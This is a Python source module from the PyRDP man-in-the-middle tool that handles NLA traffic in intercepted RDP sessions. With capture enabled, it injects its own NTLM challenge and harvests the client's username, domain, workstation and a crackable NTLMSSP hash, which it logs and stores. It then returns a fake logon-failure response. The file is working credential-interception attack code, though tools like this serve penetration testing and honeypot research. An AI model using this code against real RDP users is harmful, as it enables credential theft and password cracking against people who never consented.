#
# This file is part of the PyRDP project.
# Copyright (C) 2021, 2022 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import logging
import codecs
import secrets
from typing import Callable, Optional

from pyrdp.enum import NTLMSSPMessageType
from pyrdp.layer import SegmentationObserver, IntermediateLayer
from pyrdp.logging import LOGGER_NAMES
from pyrdp.logging.formatters import NTLMSSPHashFormatter
from pyrdp.mitm.fingerprint import resolveNTLMVersion
from pyrdp.parser import NTLMSSPParser
from pyrdp.pdu import NTLMSSPPDU, NTLMSSPChallengePDU, NTLMSSPAuthenticatePDU
from pyrdp.security import NTLMSSPState


class NLAHandler(SegmentationObserver):
    """
    Handles NLA packets by forwarding them transparently, using the onUnknownHeader event from SegmentationObserver.
    The event will be triggered when packets are sent that are neither fast-path nor TPKT (i.e: NLA).
    This also logs the hash of NLA connection attempts.
    """

    def __init__(self, sink: IntermediateLayer, state: NTLMSSPState, log: logging.LoggerAdapter,
                 ntlmCapture: bool = False, challenge: str = None,
                 disconnectCallback: Optional[Callable[[], None]] = None,
                 mitmState=None):
        """
        Create a new NLA Handler.
        sink: layer to forward packets to.
        state: NTLMSSPState that is shared between both the client-facing handler and the server-facing handler.
        disconnectCallback: called after hash capture to trigger clean connection teardown.
        mitmState: RDPMITMState for storing NTLM intelligence in fleet events.
        """

        super().__init__()
        self.sink = sink
        self.ntlmSSPState = state
        self.ntlmSSPParser = NTLMSSPParser()
        self.ntlmCapture = ntlmCapture
        self.challenge = challenge
        self.log = log
        self.disconnectCallback = disconnectCallback
        self.mitmState = mitmState

    def getChallenge(self):
        """
        Return configured challenge or a random 64-bit challenge
        """
        if self.challenge is None:
            challenge = b'%016x' % secrets.randbits(16 * 4)
        else:
            challenge = self.challenge
        return codecs.decode(challenge, 'hex')

    def onUnknownHeader(self, header, data: bytes):
        signatureOffset = self.ntlmSSPParser.findMessage(data)

        if signatureOffset != -1:
            message: NTLMSSPPDU = self.ntlmSSPParser.parse(data)
            self.ntlmSSPState.setMessage(message)

            if message.messageType == NTLMSSPMessageType.NEGOTIATE_MESSAGE and self.ntlmCapture:
                rawChallenge = self.getChallenge()
                self.log.debug("NTLMSSP Negotiation")
                challenge: NTLMSSPChallengePDU = NTLMSSPChallengePDU(rawChallenge)

                # There might be no state if server side connection was shutdown
                if not self.ntlmSSPState:
                    self.ntlmSSPState = NTLMSSPState()
                self.ntlmSSPState.setMessage(challenge)
                self.ntlmSSPState.challenge.serverChallenge = rawChallenge
                data = self.ntlmSSPParser.writeNTLMSSPChallenge('WINNT', rawChallenge)

            if message.messageType == NTLMSSPMessageType.AUTHENTICATE_MESSAGE:
                message: NTLMSSPAuthenticatePDU
                user = message.user
                domain = message.domain
                serverChallenge = self.ntlmSSPState.challenge.serverChallenge
                proof = message.proof
                response = message.response

                logging.getLogger(LOGGER_NAMES.NTLMSSP).info(user, domain, serverChallenge, proof, response)

                ntlmSSPHash = NTLMSSPHashFormatter.formatNTLMSSPHash(user, domain, serverChallenge, proof, response)
                self.log.info("[!] NTLMSSP Hash: %(ntlmSSPHash)s", {
                    "ntlmSSPHash": (ntlmSSPHash)
                })

                # Store NTLM intelligence in MITM state for fleet events
                if self.mitmState is not None:
                    ntlmVersion = resolveNTLMVersion(message.version) if message.version else ""
                    self.mitmState.ntlmInfo = {
                        "user": user,
                        "domain": domain,
                        "workstation": message.workstation,
                        "hash": ntlmSSPHash,
                        "negotiate_flags": message.negotiateFlags,
                    }
                    if ntlmVersion:
                        self.mitmState.ntlmInfo["ntlm_os_version"] = ntlmVersion
                    self.log.info("NTLM workstation=%(ws)s version=%(ver)s", {
                        "ws": message.workstation, "ver": ntlmVersion
                    })

                if self.ntlmCapture:
                    # Send a clean CredSSP error instead of letting the TLS tunnel die
                    errorResponse = self.ntlmSSPParser.writeTSRequestError(
                        version=6,
                        errorCode=0xC000006D  # STATUS_LOGON_FAILURE
                    )
                    self.sink.sendBytes(errorResponse)

                    if self.disconnectCallback:
                        self.disconnectCallback()
                    return  # Don't forward to server

        self.sink.sendBytes(data)
